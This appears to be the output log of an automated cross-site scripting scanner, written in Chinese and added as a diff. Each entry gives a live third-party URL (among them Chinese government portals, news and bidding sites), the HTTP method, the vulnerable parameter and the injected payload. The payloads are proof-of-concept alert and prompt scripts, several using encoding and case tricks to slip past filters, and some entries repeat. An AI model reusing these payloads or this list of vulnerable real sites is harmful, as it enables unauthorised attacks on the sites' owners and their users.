@@ -1,0 +1,220 @@
+检测网址 : http://llgfcb.com/sershow.asp?smallname=</script>"><script>prompt(1)</script>%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E
+提交方式 : POST
+漏洞参数 : smallname
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://zbcggl.ctba.org.cn/web/showlist?type=</script>"><script>prompt(1)</script>new
+提交方式 : GET
+漏洞参数 : type
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://m.b2b168.com/Login.aspx?Url=</script>"><script>prompt(1)</script>%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E&spm=636936339477785092
+提交方式 : POST
+漏洞参数 : Url
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://www.chinabidding.com/en/info/search.htm?tradeClassCodes= and 1=2 <script>alert(1)</script>03
+提交方式 : GET
+漏洞参数 : tradeClassCodes
+攻击载荷 :  and 1=2 <script>alert(1)</script>
+------------------------------------
+检测网址 : http://llgfcb.com/sershow.asp?smallname=</script>"><script>prompt(1)</script>%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E
+提交方式 : POST
+漏洞参数 : smallname
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://zbcggl.ctba.org.cn/web/showlist?type=</script>"><script>prompt(1)</script>new
+提交方式 : GET
+漏洞参数 : type
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://m.b2b168.com/Login.aspx?Url=</script>"><script>prompt(1)</script>%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E&spm=636936339477785092
+提交方式 : POST
+漏洞参数 : Url
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://www.chinabidding.com/en/info/search.htm?tradeClassCodes= and 1=2 <script>alert(1)</script>03
+提交方式 : GET
+漏洞参数 : tradeClassCodes
+攻击载荷 :  and 1=2 <script>alert(1)</script>
+------------------------------------
+检测网址 : http://travel315.people.com.cn/iframe/shw_xml.php?c_id="><svg/onload=co\u006efir\u006d`1`>19624
+提交方式 : GET
+漏洞参数 : c_id
+攻击载荷 : "><svg/onload=co\u006efir\u006d`1`>
+------------------------------------
+检测网址 : http://travel315.people.com.cn/iframe/shw_xml.php?c_id="><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>19624
+提交方式 : GET
+漏洞参数 : c_id
+攻击载荷 : "><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>
+------------------------------------
+检测网址 : http://travel315.people.com.cn/iframe/shw_xml.php?c_id="><textarea autofocus onfocus=co\u006efir\u006d(1)>19624
+提交方式 : GET
+漏洞参数 : c_id
+攻击载荷 : "><textarea autofocus onfocus=co\u006efir\u006d(1)>
+------------------------------------
+检测网址 : http://travel315.people.com.cn/iframe/shw_xml.php?c_id="><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome19624
+提交方式 : GET
+漏洞参数 : c_id
+攻击载荷 : "><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome
+------------------------------------
+检测网址 : http://travel315.people.com.cn/iframe/shw_xml.php?c_id="><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>19624
+提交方式 : GET
+漏洞参数 : c_id
+攻击载荷 : "><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId=</script>"><script>prompt(1)</script>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId= and 1=2 <script>alert(1)</script>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 :  and 1=2 <script>alert(1)</script>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId=</ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : </ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><img src=x onerror=prompt(1)>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><img src=x onerror=prompt(1)>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><svg/onload=prompt(1)>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><svg/onload=prompt(1)>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><iframe/src=javascript:prompt(1)>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><iframe/src=javascript:prompt(1)>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><h1 onclick=prompt(1)>Clickme</h1>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><h1 onclick=prompt(1)>Clickme</h1>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><a href=javascript:prompt(1)>Clickme</a>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><a href=javascript:prompt(1)>Clickme</a>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><a href="javascript:confirm%28 1%29">Clickme</a>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><a href="javascript:confirm%28 1%29">Clickme</a>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+">click</a>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><textarea autofocus onfocus=prompt(1)>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><textarea autofocus onfocus=prompt(1)>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><script>co\u006efir\u006d`1`</script>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><script>co\u006efir\u006d`1`</script>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><ScRiPt>co\u006efir\u006d`1`</ScRiPt>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><ScRiPt>co\u006efir\u006d`1`</ScRiPt>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><img src=x onerror=co\u006efir\u006d`1`>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><img src=x onerror=co\u006efir\u006d`1`>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><svg/onload=co\u006efir\u006d`1`>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><svg/onload=co\u006efir\u006d`1`>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><iframe/src=javascript:co\u006efir\u006d%28 1%29>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><iframe/src=javascript:co\u006efir\u006d%28 1%29>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><a href=javascript:prompt%28 1%29>Clickme</a>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><a href=javascript:prompt%28 1%29>Clickme</a>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><a href="javascript:co\u006efir\u006d%28 1%29">Clickme</a>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><a href="javascript:co\u006efir\u006d%28 1%29">Clickme</a>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><textarea autofocus onfocus=co\u006efir\u006d(1)>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><textarea autofocus onfocus=co\u006efir\u006d(1)>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><img/src=x%0Aonerror=prompt`1`>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><img/src=x%0Aonerror=prompt`1`>
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">
+------------------------------------
+检测网址 : http://map.zjzwfw.gov.cn/map/mapservice.jsp?webId="><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>86
+提交方式 : GET
+漏洞参数 : webId
+攻击载荷 : "><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>
+------------------------------------
+检测网址 : http://www.ykjtzb.com:8800/ebidding/UserAction.do?sid=</script>"><script>prompt(1)</script>%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E&no_sitemesh=&method=regChannel
+提交方式 : POST
+漏洞参数 : sid
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://sp.shaanxi.gov.cn:9004/qas/index?id=</script>"><script>prompt(1)</script>764
+提交方式 : GET
+漏洞参数 : id
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://link.bendibao.com/linkto.aspx?url="><img src=x onerror=prompt(1)>http://pages.ctrip.com/commerce/promote/201306/other/tbx/index.html
+提交方式 : GET
+漏洞参数 : url
+攻击载荷 : "><img src=x onerror=prompt(1)>
+------------------------------------
+检测网址 : http://m.b2b168.com/Login.aspx?Url=</script>"><script>prompt(1)</script>%3C%2Fscript%3E%22%3E%3Cscript%3Eprompt%281%29%3C%2Fscript%3E&spm=636936350797320974
+提交方式 : POST
+漏洞参数 : Url
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
+检测网址 : http://reg.eduu.com/login/?url=</script>"><script>prompt(1)</script>http://school.zhongkao.com/school/xxdp/249553/
+提交方式 : GET
+漏洞参数 : url
+攻击载荷 : </script>"><script>prompt(1)</script>
+------------------------------------
